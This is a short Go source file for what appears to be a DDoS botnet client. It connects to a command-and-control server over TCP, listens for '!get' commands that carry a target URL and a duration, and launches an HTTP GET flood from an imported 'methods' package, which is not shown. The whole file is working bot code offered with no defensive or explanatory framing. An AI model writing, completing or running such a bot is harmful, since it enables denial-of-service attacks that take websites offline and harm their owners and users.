package main

import (
	"bufio"
	"fmt"
	"gnet/methods"
	"net"
	"strconv"
	"strings"
)

var (
	IP       = "localhost"
	BOT_PORT = "142"
)

func main() {
	fmt.Print("start\n")
	Listener()
}

func Listener() {

	BotReceiver, err := net.Dial("tcp", net.JoinHostPort(IP, BOT_PORT))

	if err != nil {
		fmt.Print(err)
	}

	BotScanner := bufio.NewScanner(BotReceiver)

	for BotScanner.Scan() {
		if strings.TrimSpace(BotScanner.Text()) != "" {
			fmt.Println("received")
			go HandlerCommand(BotScanner.Text())
		}
	}

	if err := BotScanner.Err(); err != nil {
		fmt.Println("scanner error:", err)
	} else {
		fmt.Println("scanner ended (EOF or connection closed)")
	}

}

func HandlerCommand(Command string) {

	// to use methods, ts is very sloppy code

	if len(strings.Split(Command, " ")) == 3 {
		if strings.Split(Command, " ")[0] == "!get" {
			fmt.Println("we hitting this now!!")
			URL := strings.Split(Command, " ")[1]
			SECONDS, _ := strconv.Atoi(strings.Split(Command, " ")[2])
			go methods.GetFlood(URL, SECONDS)
		}
	}

}
